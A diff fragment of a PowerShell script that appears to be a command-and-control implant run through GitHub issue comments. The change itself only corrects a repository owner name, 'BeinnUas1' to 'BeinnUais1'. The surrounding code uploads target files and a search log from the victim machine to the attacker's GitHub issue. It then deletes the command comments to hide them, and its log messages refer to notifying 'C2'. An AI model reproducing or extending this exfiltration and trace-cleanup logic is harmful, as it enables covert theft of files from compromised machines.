@@ -202,13 +202,13 @@ try
                     Send-PackageMessage -PackageName "FILE" -IssueNumber $issueNumber -Body ($fileBytes)
                     Write-Console -Body ("Uploaded target file. Attempting to delete the UPLOAD_FILE command comment...") -IssueNumber $issueNumber
                     Write-Host ("DEBUG: Uploaded target file. Attempting to delete the UPLOAD_FILE command comment...")
-                    Remove-GitHubComment -OwnerName BeinnUas1 -RepositoryName ceannard1 -CommentID $comment.ID
+                    Remove-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -CommentID $comment.ID
                     Write-Console -Body ("Deleted UPLOAD_FILE command comment.") -IssueNumber $issueNumber
                     Write-Host ("DEBUG: Deleted UPLOAD_FILE command comment.")
                 }
                 ElseIf(!([System.IO.File]::Exists($targetFilePath)))
                 {
-                    Remove-GitHubComment -OwnerName BeinnUas1 -RepositoryName ceannard1 -CommentID $comment.ID
+                    Remove-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -CommentID $comment.ID
                     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command.")
                     Write-Console -Body ("Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command. Notified C2. Exiting.") -IssueNumber $issueNumber
                     Write-Host ("DEBUG: Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command. Notified C2. Exiting."); Start-Sleep -s 600
@@ -230,7 +230,7 @@ try
                 Send-PackageMessage -Package "SEARCHER" -IssueNumber $issueNumber -Body (Get-Content -Path $searcherLogPath -Raw)
                 Write-Console -Body ("Upload complete. Attempting to delete the REFRESH_SEARCHER_LOG command comment...") -IssueNumber $issueNumber
                 Write-Host ("DEBUG: Upload complete. Attempting to delete the REFRESH_SEARCHER_LOG command comment...")
-                Remove-GitHubComment -OwnerName BeinnUas1 -RepositoryName ceannard1 -CommentID $comment.ID
+                Remove-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -CommentID $comment.ID
                 Write-Console -Body ("Deleted REFRESH_SEARCHER_LOG command comment.") -IssueNumber $issueNumber
                 Write-Host ("DEBUG: Deleted REFRESH_SEARCHER_LOG command comment.")
             }
